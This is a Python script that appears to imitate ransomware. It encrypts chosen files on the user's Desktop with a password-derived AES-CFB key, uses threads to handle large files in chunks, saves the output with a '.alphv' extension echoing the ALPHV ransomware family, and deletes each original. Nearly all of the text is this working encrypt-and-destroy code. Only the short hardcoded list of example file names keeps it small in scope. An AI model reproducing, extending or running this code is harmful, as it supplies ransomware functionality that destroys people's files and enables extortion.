import os
from concurrent.futures import ThreadPoolExecutor
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.backends import default_backend
from getpass import getpass

# Function to generate key and IV
def generate_key_iv(password, salt):
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = kdf.derive(password.encode())
    iv = os.urandom(16)
    return key, iv

# Function to encrypt data (for small files)
def encrypt(data, password):
    salt = os.urandom(16)
    key, iv = generate_key_iv(password, salt)
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    ciphertext = encryptor.update(data) + encryptor.finalize()
    return salt + iv + ciphertext

# Function to encrypt a chunk of a large file
def encrypt_chunk(chunk, password):
    salt = os.urandom(16)
    key, iv = generate_key_iv(password, salt)
    cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    return salt + iv + (encryptor.update(chunk) + encryptor.finalize())

# Function to handle file encryption
def encrypt_file(file_path, password, chunk_size=10 * 1024 * 1024):  # Set chunk size to 10 MB
    file_size = os.path.getsize(file_path)
    if file_size < chunk_size:  # Small file, single-threaded
        with open(file_path, "rb") as f:
            data = f.read()
        encrypted_data = encrypt(data, password)
        print(f"File '{file_path}' encrypted using single-threading.")
    else:  # Large file, multi-threaded
        encrypted_data = b""
        with open(file_path, "rb") as f:
            chunks = []
            while True:
                chunk = f.read(chunk_size)
                if not chunk:
                    break
                chunks.append(chunk)

        with ThreadPoolExecutor() as executor:
            results = executor.map(lambda chunk: encrypt_chunk(chunk, password), chunks)
            for result in results:
                encrypted_data += result

        print(f"File '{file_path}' encrypted using multi-threading across {len(chunks)} chunks.")

    encrypted_file_path = file_path + ".alphv"
    with open(encrypted_file_path, "wb") as f:
        f.write(encrypted_data)
    os.remove(file_path)
    return encrypted_file_path

# List of files to target for multi-threaded encryption
target_files = ['example1.txt', 'example2.docx', 'example3.pdf']

# Path to directory containing files to encrypt (e.g., Desktop)
directory_path = os.path.join(os.path.expanduser("~"), "Desktop")

# Encrypt files in the directory
password = getpass("Enter a password for encryption: ")
for filename in os.listdir(directory_path):
    file_path = os.path.join(directory_path, filename)
    if os.path.isfile(file_path) and filename in target_files:
        encrypted_file_path = encrypt_file(file_path, password)
        print(f"File '{filename}' encrypted and saved as '{os.path.basename(encrypted_file_path)}'.")
